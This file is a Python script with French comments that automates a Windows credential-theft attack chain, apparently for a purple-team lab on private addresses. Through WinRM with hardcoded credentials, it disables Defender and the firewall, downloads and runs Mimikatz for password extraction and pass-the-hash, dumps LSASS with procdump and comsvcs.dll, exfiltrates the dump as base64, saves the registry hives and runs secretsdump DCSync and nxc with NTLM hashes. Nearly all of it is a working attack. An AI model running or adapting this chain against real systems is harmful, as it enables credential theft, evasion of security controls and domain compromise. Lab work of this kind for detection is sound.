# Activate venv: source venv-pywinrm/bin/activate
#====================
# Import des modules:
#====================
import winrm
import subprocess
import base64
import os
import tempfile

"""
- supprimer les fichiers / exécutables téléchargés / générés pour la prochaine exécution du script => permettra d'éviter les erreurs inutiles
- modifier le nom du fichier de dump lsass
- ajouter les opérations ntlmrelay de récupération du hash utilisateur et casse mdp avec hashcat
- demander quel scénario exécuter
- faire la gestion des erreurs
"""

#=============
# Tests WinRM:
#=============
"""
session = winrm.Session(
    'http://192.168.25.5:5985/wsman',
    auth=('clientwin1', 'clientwin1'),
    transport='negociate'  # required for Windows auth
)
response = session.run_cmd("whoami")
print(response.std_out.decode())

response = session.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-LocalUser | Out-String')
print("STDOUT:\n", response.std_out.decode('utf-8'))
print("STDERR:\n", response.std_err.decode('utf-8'))
"""

#============================
# Lancement script détection:
#============================
"""
print(
    "***************************\n"
    "Lancement script détection:\n"
    "***************************\n"
)
# Récupère le chemin absolu du script actuel
#script_dir = os.path.dirname(os.path.abspath(__file__))

# Construit la commande à exécuter dans gnome-terminal
#command_execution_detection_py = f'cd "{script_dir}" && sleep 2; python3 detection.py; exec bash'
#lancement_script_detection = subprocess.run(['gnome-terminal', '--', 'bash', 'c' , command_execution_detection_py], shell=True, capture_output=True, text=True)
lancement_script_detection = subprocess.run(['xfce4-terminal', '--hold', '--command', 'bash -c "python3 detection.py; exec bash"'], shell=True, capture_output=True, text=True)
#lancement_script_detection = subprocess.run(['gnome-terminal', '--', 'echo "test"'], shell=True, capture_output=True, text=True)
print(
    "**************************\n"
    "Résultat script détection:\n"
    "**************************\n"
    + lancement_script_detection.stdout
)
print(
    "************************\n"
    "Erreur script détection:\n"
    "************************\n"
    + lancement_script_detection.stderr
)
"""

# Création du script temporaire
with tempfile.NamedTemporaryFile(delete=False, suffix=".sh", mode='w') as script_file:
    script_file.write(f"""#!/bin/bash
cd "{os.getcwd()}"
python3 detection.py
exec bash
""")
    script_path = script_file.name

# Rendre le script exécutable
os.chmod(script_path, 0o755)

# Lancer xfce4-terminal avec le script
subprocess.Popen([
    'xfce4-terminal', '--hold', '--command', script_path
])

#==========================
# Tactique: Reconnaissance:
#==========================
#======================================================================================================================#
#                                                       Niveau 1                                                       #
#======================================================================================================================#
#=====================
# Lancement scan nmap:
#=====================
print(
    "*************************************************\n"
    "Lancement de l'attaque Reconnaissance => Niveau 1\n"
    "*************************************************\n"
)
nmap_scan_result = subprocess.run(["nmap -sT -p- -T5 192.168.25.25 -Pn"], shell=True, capture_output=True, text=True)
print(
    "**********************************\n"
    "Résultat du scan nmap de Niveau 1:\n"
    "**********************************\n"
    + nmap_scan_result.stdout
)
print(
    "********************************\n"
    "Erreur du scan nmap de Niveau 1:\n"
    "********************************\n"
    + nmap_scan_result.stderr
)

#=================================
# Récupération évènements Network:
#=================================
print(
    "*************************************\n"
    "Récupération des évènements Network 3\n"
    "*************************************\n"
)
session_winrm = winrm.Session(
    'http://192.168.25.5:5985/wsman',
    auth=('clientwin1', 'clientwin1'),
    transport='basic'  # required for Windows auth
)
#response = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Select-Object -First 5 | Format-List TimeCreated, Id, Message | Out-String')
response = session_winrm.run_ps(
    '[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; '
    'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | '
    'Where-Object { $_.Id -eq 3 } | '
    'Select-Object -First 5 TimeCreated, Id, Message | '
    'Format-List TimeCreated, Id, Message | '
    'Out-String'
)
print("STDOUT:\n", response.std_out.decode('utf-8'))
print("STDERR:\n", response.std_err.decode('utf-8'))


#=============================
# Tactique: Credential Access:
#=============================
#======================================================================================================================#
#                                                       Niveau 1                                                       #
#======================================================================================================================#
#===========================
# Lancement énumération SMB:
#===========================
print(
    "****************************************************\n"
    "Lancement de l'attaque Credential Access => Niveau 1\n"
    "****************************************************\n"
)
enum4linux_result = subprocess.run(["enum4linux -u clientwin1 -p clientwin1 -a 192.168.25.5"], shell=True, capture_output=True, text=True)
print(
    "************************\n"
    "Résultat éumération SMB:\n"
    "************************\n"
    + enum4linux_result.stdout
)
print(
    "**********************\n"
    "Erreur éumération SMB:\n"
    "**********************\n"
    + enum4linux_result.stderr
)

#===============
# Lancement RDP:
#===============
print(
    "****************\n"
    "Lancement du RDP\n"
    "****************\n"
)
rdp_clientwin1 = subprocess.run(["xfreerdp3 /u:clientwin1 /p:clientwin1 /v:192.168.25.5 /cert:ignore & sleep 5 && pkill -f xfreerdp3"], shell=True, capture_output=True, text=True)
print(
    "**********************************\n"
    "Résultat du RDP sur le clientwin1:\n"
    "**********************************\n"
    + rdp_clientwin1.stdout
)
print(
    "**********************************\n"
    "Erreur du RDP sur le clientwin1:\n"
    "**********************************\n"
    + rdp_clientwin1.stderr
)

#=======================================================================
# Lancement opérations de désactivation de Windows Defender et Firewall:
#=======================================================================
print(
    "*********************************************************************\n"
    "Lancement opérations de désactivation de Windows Defender et Firewall\n"
    "*********************************************************************\n"
)
session_winrm = winrm.Session(
    'http://192.168.25.5:5985/wsman',
    auth=('clientwin1', 'clientwin1'),
    transport='basic'  # required for Windows auth
)

#======================================
# Désactivation du realtime monitoring:
#======================================
print(
    "***********************************************\n"
    "Lancement désactivation du realtime monitoring:\n"
    "***********************************************\n"
)
disable_real_time_monitoring = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableRealtimeMonitoring $true | Out-String')
print(
    "**********************************************\n"
    "Résultat désactivation du realtime monitoring:\n"
    "**********************************************\n"
    + disable_real_time_monitoring.std_out.decode('utf-8')
)
print(
    "********************************************\n"
    "Erreur désactivation du realtime monitoring:\n"
    "********************************************\n"
    + disable_real_time_monitoring.std_err.decode('utf-8')
)

#========================================
# Désactivation du behavioral monitoring:
#========================================
print(
    "*************************************************\n"
    "Lancement désactivation du behavioral monitoring:\n"
    "*************************************************\n"
)
disable_behavioral_monitoring = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableBehaviorMonitoring $true | Out-String')
print(
    "************************************************\n"
    "Résultat désactivation du behavioral monitoring:\n"
    "************************************************\n"
    + disable_behavioral_monitoring.std_out.decode('utf-8')
)
print(
    "**********************************************\n"
    "Erreur désactivation du behavioral monitoring:\n"
    "**********************************************\n"
    + disable_behavioral_monitoring.std_err.decode('utf-8')
)

#===============================
# Désactivation IOAV protection:
#===============================
print(
    "****************************************\n"
    "Lancement désactivation IOAV protection:\n"
    "****************************************\n"
)
disable_IOAV_protection = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableIOAVProtection $true | Out-String')
print(
    "***************************************\n"
    "Résultat désactivation IOAV protection:\n"
    "***************************************\n"
    + disable_IOAV_protection.std_out.decode('utf-8')
)
print(
    "*************************************\n"
    "Erreur désactivation IOAV protection:\n"
    "*************************************\n"
    + disable_IOAV_protection.std_err.decode('utf-8')
)

#===================================
# Désactivation Block At First Seen:
#===================================
print(
    "********************************************\n"
    "Lancement désactivation Block At First Seen:\n"
    "********************************************\n"
)
disable_Block_At_First_Seen = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableBlockAtFirstSeen $true | Out-String')
print(
    "*******************************************\n"
    "Résultat désactivation Block At First Seen:\n"
    "*******************************************\n"
    + disable_Block_At_First_Seen.std_out.decode('utf-8')
)
print(
    "*****************************************\n"
    "Erreur désactivation Block At First Seen:\n"
    "*****************************************\n"
    + disable_Block_At_First_Seen.std_err.decode('utf-8')
)

#===============================
# Désactivation Script Scanning:
#===============================
print(
    "****************************************\n"
    "Lancement désactivation Script Scanning:\n"
    "****************************************\n"
)
disable_Script_Scanning = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableScriptScanning $true | Out-String')
print(
    "***************************************\n"
    "Résultat désactivation Script Scanning:\n"
    "***************************************\n"
    + disable_Script_Scanning.std_out.decode('utf-8')
)
print(
    "*************************************\n"
    "Erreur désactivation Script Scanning:\n"
    "*************************************\n"
    + disable_Script_Scanning.std_err.decode('utf-8')
)

#===============================
# Ajout Exclusion Path Mimitakz:
#===============================
print(
    "****************************************\n"
    "Lancement ajout Exclusion Path Mimitakz:\n"
    "****************************************\n"
)
ajout_exclusion_path_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Add-MpPreference -ExclusionPath "C:\\Users\\Public\\mimikatz" | Out-String')
print(
    "***************************************\n"
    "Résultat ajout Exclusion Path Mimitakz:\n"
    "***************************************\n"
    + ajout_exclusion_path_mimikatz.std_out.decode('utf-8')
)
print(
    "*************************************\n"
    "Erreur ajout Exclusion Path Mimitakz:\n"
    "*************************************\n"
    + ajout_exclusion_path_mimikatz.std_err.decode('utf-8')
)

#================================
# Désactivation Network Firewall:
#================================
print(
    "*****************************************\n"
    "Lancement désactivation Network Firewall:\n"
    "*****************************************\n"
)
desactivation_network_firewall = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False | Out-String')
print(
    "****************************************\n"
    "Résultat désactivation Network Firewall:\n"
    "****************************************\n"
    + desactivation_network_firewall.std_out.decode('utf-8')
)
print(
    "**************************************\n"
    "Erreur désactivation Network Firewall:\n"
    "**************************************\n"
    + desactivation_network_firewall.std_err.decode('utf-8')
)

#===================
# Download Mimikatz:
#===================
print(
    "****************************\n"
    "Lancement Download Mimikatz:\n"
    "****************************\n"
)
download_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "C:\\Users\\Public\\mimikatz.zip" | Out-String')
print(
    "***************************\n"
    "Résultat Download Mimikatz:\n"
    "***************************\n"
    + download_mimikatz.std_out.decode('utf-8')
)
"""
print(
    "*************************\n"
    "Erreur Download Mimikatz:\n"
    "*************************\n"
    + download_mimikatz.std_err.decode('utf-8')
)
"""

#==================
# Extract Mimikatz:
#==================
print(
    "***************************\n"
    "Lancement Extract Mimikatz:\n"
    "***************************\n"
)
extract_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "C:\\Users\\Public\\mimikatz.zip" -DestinationPath "C:\\Users\\Public\\mimikatz" -F | Out-String')
print(
    "**************************\n"
    "Résultat Extract Mimikatz:\n"
    "**************************\n"
    + extract_mimikatz.std_out.decode('utf-8')
)
print(
    "************************\n"
    "Erreur Extract Mimikatz:\n"
    "************************\n"
    + extract_mimikatz.std_err.decode('utf-8')
)

#==========================================
# Activation mode privilege debug mimikatz:
#==========================================
print(
    "***************************************************\n"
    "Lancement Activation mode privilege debug mimikatz:\n"
    "***************************************************\n"
)
mimikatz_privilege_debug_command = r'''
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
cd C:\Users\Public\mimikatz\x64;
.\mimikatz.exe "privilege::debug" "log" "exit"
'''
mimikatz_privilege_debug = session_winrm.run_ps(mimikatz_privilege_debug_command)
print(
    "**************************************************\n"
    "Résultat Activation mode privilege debug mimikatz:\n"
    "**************************************************\n"
    + mimikatz_privilege_debug.std_out.decode('utf-8')
)
print(
    "************************************************\n"
    "Erreur Activation mode privilege debug mimikatz:\n"
    "************************************************\n"
    + mimikatz_privilege_debug.std_err.decode('utf-8')
)

#=================================================================
# Récupération credentials mimikatz module sekurlsa logonpassword:
#=================================================================
print(
    "**************************************************************************\n"
    "Lancement récupération credentials mimikatz module sekurlsa logonpassword:\n"
    "**************************************************************************\n"
)
mimikatz_sekurlsa_logonpasswords_command = r'''
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
cd C:\Users\Public\mimikatz\x64;
.\mimikatz.exe "sekurlsa::logonpasswords" "exit"
'''
mimikatz_sekurlsa_logonpasswords = session_winrm.run_ps(mimikatz_sekurlsa_logonpasswords_command)
print(
    "*************************************************************************\n"
    "Résultat récupération credentials mimikatz module sekurlsa logonpassword:\n"
    "*************************************************************************\n"
    + mimikatz_sekurlsa_logonpasswords.std_out.decode('utf-8')
)
print(
    "***********************************************************************\n"
    "Erreur récupération credentials mimikatz module sekurlsa logonpassword:\n"
    "***********************************************************************\n"
    + mimikatz_sekurlsa_logonpasswords.std_err.decode('utf-8')
)

#=================================================================================
# Récupération credentials mimikatz module sekurlsa logonpassword & pass the hash:
#=================================================================================
print(
    "******************************************************************************************\n"
    "Lancement récupération credentials mimikatz module sekurlsa logonpassword & pass the hash:\n"
    "******************************************************************************************\n"
)
mimikatz_sekurlsa_logonpasswords_pass_the_hash_command = r'''
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
cd C:\Users\Public\mimikatz\x64;
.\mimikatz.exe "sekurlsa::logonpasswords" "sekurlsa::pth /user:Administrator /domain:purple.lan /ntlm:beacc96973ecdb36af7e5a483516811f /run:cmd.exe" "exit"
'''
mimikatz_sekurlsa_logonpasswords_pass_the_hash = session_winrm.run_ps(mimikatz_sekurlsa_logonpasswords_pass_the_hash_command)
print(
    "*****************************************************************************************\n"
    "Résultat récupération credentials mimikatz module sekurlsa logonpassword & pass the hash:\n"
    "*****************************************************************************************\n"
    + mimikatz_sekurlsa_logonpasswords_pass_the_hash.std_out.decode('utf-8')
)
print(
    "***************************************************************************************\n"
    "Erreur récupération credentials mimikatz module sekurlsa logonpassword & pass the hash:\n"
    "***************************************************************************************\n"
    + mimikatz_sekurlsa_logonpasswords_pass_the_hash.std_err.decode('utf-8')
)

#======================================================================================================================#
#                                                       Niveau 2                                                       #
#======================================================================================================================#
#======================================================================================================================#
#                                                     Technique 1                                                      #
#======================================================================================================================#
#=============================================
# Vérification présence procdump.exe disque C:
#=============================================
print(
    "******************************************************\n"
    "Lancement vérification présence procdump.exe disque C:\n"
    "******************************************************\n"
)
veritification_presence_procdump_exe_disque_c = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-ChildItem -Path C:\ -Recurse -Filter procdump.exe -ErrorAction SilentlyContinue | Out-String')
print(
    "*****************************************************\n"
    "Résultat vérification présence procdump.exe disque C:\n"
    "*****************************************************\n"
    + veritification_presence_procdump_exe_disque_c.std_out.decode('utf-8')
)
print(
    "***************************************************\n"
    "Erreur vérification présence procdump.exe disque C:\n"
    "***************************************************\n"
    + veritification_presence_procdump_exe_disque_c.std_err.decode('utf-8')
)

#=============================
# Téléchargement procdump.zip:
#=============================
print(
    "**************************************\n"
    "Lancement téléchargement procdump.zip:\n"
    "**************************************\n"
)
telechargement_procdump_zip = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:Temp\Procdump.zip" | Out-String')
print(
    "*************************************\n"
    "Résultat téléchargement procdump.zip:\n"
    "*************************************\n"
    + telechargement_procdump_zip.std_out.decode('utf-8')
)
"""
print(
    "***********************************\n"
    "Erreur téléchargement procdump.zip:\n"
    "***********************************\n"
    + telechargement_procdump_zip.std_err.decode('utf-8')
)
"""

#========================
# Unzipping procdump.zip:
#========================
print(
    "*********************************\n"
    "Lancement unzipping procdump.zip:\n"
    "*********************************\n"
)
unzipping_procdump_zip = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "$env:TEMP\Procdump.zip" -DestinationPath "$env:TEMP\Procdump" -Force | Out-String')
print(
    "********************************\n"
    "Résultat unzipping procdump.zip:\n"
    "********************************\n"
    + unzipping_procdump_zip.std_out.decode('utf-8')
)
print(
    "******************************\n"
    "Erreur unzipping procdump.zip:\n"
    "******************************\n"
    + unzipping_procdump_zip.std_err.decode('utf-8')
)

#======================================
# Désactivation du realtime monitoring:
#======================================
print(
    "***********************************************\n"
    "Lancement désactivation du realtime monitoring:\n"
    "***********************************************\n"
)
disable_real_time_monitoring = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableRealtimeMonitoring $true | Out-String')
print(
    "**********************************************\n"
    "Résultat désactivation du realtime monitoring:\n"
    "**********************************************\n"
    + disable_real_time_monitoring.std_out.decode('utf-8')
)
print(
    "********************************************\n"
    "Erreur désactivation du realtime monitoring:\n"
    "********************************************\n"
    + disable_real_time_monitoring.std_err.decode('utf-8')
)

#========================
# Réalisation dump lsass:
#========================
print(
    "*********************\n"
    "Lancement dump lsass:\n"
    "*********************\n"
)
dump_lsass = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; & "$env:TEMP\Procdump\procdump.exe" -accepteula -mm lsass.exe "$env:TEMP\lsass_dump.dmp" | Out-String')
"""
print(
    "********************\n"
    "Résultat dump lsass:\n"
    "********************\n"
    + dump_lsass.std_out.decode('utf-8')
)
print(
    "******************\n"
    "Erreur dump lsass:\n"
    "******************\n"
    + dump_lsass.std_err.decode('utf-8')
)
"""

#=====================================
# Copie fichier dump Windows to Rogue:
#=====================================
recuperation_fichier_dump_base64_command = r'''
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\clientwin1\AppData\Local\Temp\lsass_dump3.dump.dmp")
[Convert]::ToBase64String($bytes)
'''

recuperation_fichier_dump_base64 = session_winrm.run_ps(recuperation_fichier_dump_base64_command)

print(
    "********************\n"
    "Résultat dump lsass:\n"
    "********************\n"
    + recuperation_fichier_dump_base64.std_out.decode('utf-8')
)

print(
    "******************\n"
    "Erreur dump lsass:\n"
    "******************\n"
    + recuperation_fichier_dump_base64.std_err.decode('utf-8')
)

recuperation_fichier_dump_base64_stripped = recuperation_fichier_dump_base64.std_out.strip()

with open("lsass_dump3.dump.dmp", "wb") as file:
    file.write(base64.b64decode(recuperation_fichier_dump_base64_stripped))

#======================================================================================================================#
#                                                     Technique 2                                                      #
#======================================================================================================================#
#===============================
# Exécution furtive via LOLBINs:
#===============================
print(
    "****************************************\n"
    "Lancement exécution furtive via LOLBINs:\n"
    "****************************************\n"
)
execution_furtive_lolbins = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump  $(Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full | Out-String')
print(
    "***************************************\n"
    "Résultat exécution furtive via LOLBINs:\n"
    "***************************************\n"
    + execution_furtive_lolbins.std_out.decode('utf-8')
)
print(
    "*************************************\n"
    "Erreur exécution furtive via LOLBINs:\n"
    "*************************************\n"
    + execution_furtive_lolbins.std_err.decode('utf-8')
)


#======================================================================================================================#
#                                                       Niveau 3                                                       #
#======================================================================================================================#
#======================================================================================================================#
#                                                     Technique 1                                                      #
#======================================================================================================================#
#======================================
# Backup ruche de registre HKLM\SYSTEM:
#======================================
print(
    "***********************************************\n"
    r"Lancement backup ruche de registre HKLM\SYSTEM:\n"
    "***********************************************\n"
)
backup_ruche_registre_hklm_system = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SYSTEM C:\Temp\SYSTEM | Out-String')
print(
    "**********************************************\n"
    r"Résultat backup ruche de registre HKLM\SYSTEM:\n"
    "**********************************************\n"
    + backup_ruche_registre_hklm_system.std_out.decode('utf-8')
)
print(
    "********************************************\n"
    r"Erreur backup ruche de registre HKLM\SYSTEM:\n"
    "********************************************\n"
    + backup_ruche_registre_hklm_system.std_err.decode('utf-8')
)

#========================================
# Backup ruche de registre HKLM\SECURITY:
#========================================
print(
    "*************************************************\n"
    r"Lancement backup ruche de registre HKLM\SECURITY:\n"
    "*************************************************\n"
)
backup_ruche_registre_hklm_security = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SECURITY C:\Temp\SECURITY | Out-String')
print(
    "************************************************\n"
    r"Résultat backup ruche de registre HKLM\SECURITY:\n"
    "************************************************\n"
    + backup_ruche_registre_hklm_security.std_out.decode('utf-8')
)
print(
    "**********************************************\n"
    r"Erreur backup ruche de registre HKLM\SECURITY:\n"
    "**********************************************\n"
    + backup_ruche_registre_hklm_security.std_err.decode('utf-8')
)


#========================================
# Export ruche de registre HKLM\SECURITY:
#========================================
print(
    "*************************************************\n"
    r"Lancement export ruche de registre HKLM\SECURITY:\n"
    "*************************************************\n"
)
export_ruche_registre_hklm_security_command = r'''
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
cd C:\Users\Public;
.\PsExec64.exe -accepteula -s reg save HKLM\SECURITY $env:Temp\secrets /y
'''
export_ruche_registre_hklm_security = session_winrm.run_ps(export_ruche_registre_hklm_security_command)
print(
    "************************************************\n"
    r"Résultat export ruche de registre HKLM\SECURITY:\n"
    "************************************************\n"
    + export_ruche_registre_hklm_security.std_out.decode('cp1252')
)
print(
    "**********************************************\n"
    r"Erreur export ruche de registre HKLM\SECURITY:\n"
    "**********************************************\n"
    + export_ruche_registre_hklm_security.std_err.decode('cp1252')
)


#======================================================
# Export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:
#======================================================
print(
    "***************************************************************\n"
    r"Lancement export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
    "***************************************************************\n"
)
export_ruche_registre_hkey_local_machine_security_command = r'''
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
cd C:\Users\Public;
.\PsExec64.exe -accepteula -s reg save "HKEY_LOCAL_MACHINE\SECURITY" "$env:Temp\secrets" /y
'''
export_ruche_registre_hkey_local_machine_security = session_winrm.run_ps(export_ruche_registre_hkey_local_machine_security_command)
print(
    "**************************************************************\n"
    r"Résultat export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
    "**************************************************************\n"
    + export_ruche_registre_hkey_local_machine_security.std_out.decode('cp1252')
)
print(
    "************************************************************\n"
    r"Erreur export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
    "************************************************************\n"
    + export_ruche_registre_hkey_local_machine_security.std_err.decode('cp1252')
)

#======================================================================================================================#
#                                                     Technique 2                                                      #
#======================================================================================================================#
print(
    "****************\n"
    "Lancement DCSync\n"
    "****************\n"
)
#================================
# Lancement impacket secretsdump:
#================================
print(
    "*******************************\n"
    "Lancement impacket secretsdump:\n"
    "*******************************\n"
)
impacket_secretsdump = subprocess.run(["python3 -m impacket.examples.secretsdump 'purple.lan/Administrator@192.168.25.25' -hashes :NTLMHASH"], shell=True, capture_output=True, text=True)
print(
    "******************************\n"
    "Résultat impacket secretsdump:\n"
    "******************************\n"
    + impacket_secretsdump.stdout
)
print(
    "****************************\n"
    "Erreur impacket secretsdump:\n"
    "****************************\n"
    + impacket_secretsdump.stderr
)

#============================
# Lancement crackmapexec SMB:
#============================
"""
print(
    "***************************\n"
    "Lancement crackmapexec SMB:\n"
    "***************************\n"
)
crackmapexec_smb = subprocess.run(["crackmapexec smb 192.168.25.25 -u Administrator -H NTLMHASH"], shell=True, capture_output=True, text=True)
print(
    "**************************\n"
    "Résultat crackmapexec SMB:\n"
    "**************************\n"
    + crackmapexec_smb.stdout
)
print(
    "************************\n"
    "Erreur crackmapexec SMB:\n"
    "************************\n"
    + crackmapexec_smb.stderr
)
"""

#============================
# Lancement NXC SMB:
#============================
print(
    "******************\n"
    "Lancement NXC SMB:\n"
    "******************\n"
)
#nxc_smb = subprocess.run(["nxc smb -t 192.168.25.25 -u Administrator -H NTLMHASH"], shell=True, capture_output=True, text=True)
nxc_smb = subprocess.run(["nxc smb 192.168.25.25 -u Administrator -H NTLMHASH"], shell=True, capture_output=True, text=True)
print(
    "*****************\n"
    "Résultat NXC SMB:\n"
    "*****************\n"
    + nxc_smb.stdout
)
print(
    "***************\n"
    "Erreur NXC SMB:\n"
    "***************\n"
    + nxc_smb.stderr
)







